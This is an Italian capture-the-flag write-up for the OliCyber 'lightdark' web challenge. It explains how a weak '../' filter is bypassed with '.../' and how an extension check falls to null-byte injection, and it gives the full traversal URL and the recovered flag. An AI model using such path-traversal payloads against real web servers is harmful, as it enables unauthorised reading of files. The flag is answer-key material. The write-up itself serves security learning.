@@ -1,0 +1,19 @@
+http://lightdark.challs.olicyber.it/index.php?tema=dark.css2 vuln
+
+1)$path = str_replace('../', './' , $path);
+sostituisce ../ con ./
+pertanto basta mettere tre . per andare indietro nei path tipo .../
+
+2)if($estensione != "css"){
+  $error = true;
+  $path = substr($path, 0, -3) . "css";
+  è vulnerabile ad un null byte injection %00.css
+  
+3) sappiamo che la flag si trova in flag.txt
+
+pertanto facendo diverse prove tra i path troviamo:
+http://lightdark.challs.olicyber.it/index.php?tema=.../.../.../.../.../flag.txt%00.css
+
+ispeziona
+sotto la parte di style, nel html del codice si trova la flag:
+flag{l1ght_1s_f0r_n00bs_d4rk_1s_f0r_h4ck3rs}  
